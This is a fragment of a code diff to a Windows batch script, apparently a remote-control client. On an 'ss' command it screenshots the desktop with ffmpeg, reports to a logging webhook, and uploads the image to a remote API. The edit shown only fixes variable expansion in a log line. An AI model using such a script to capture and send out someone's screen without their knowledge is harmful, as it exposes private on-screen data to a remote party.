@@ -24,8 +24,9 @@ if "%result%"=="ss" (
     if exist ss.webp del ss.webp
     ffmpeg -f gdigrab -i desktop -draw_mouse 1 -vframes 1 ss.webp
     set "exitCode=!errorlevel!"
+    
     if exist ss.webp (
-        curl -d content="**%name%**: Captured a screenshot. ffmpeg exit code: %exitCode%" %logging%
+        curl -d content="**%name%**: Captured a screenshot. ffmpeg exit code: !exitCode!" %logging%
         curl -s -X POST -F "name=%name%" -F "image=@ss.webp" "%apiRoot%/ss"
     ) else (
         curl -d content="**%name%**: Error capturing screenshot" %logging%
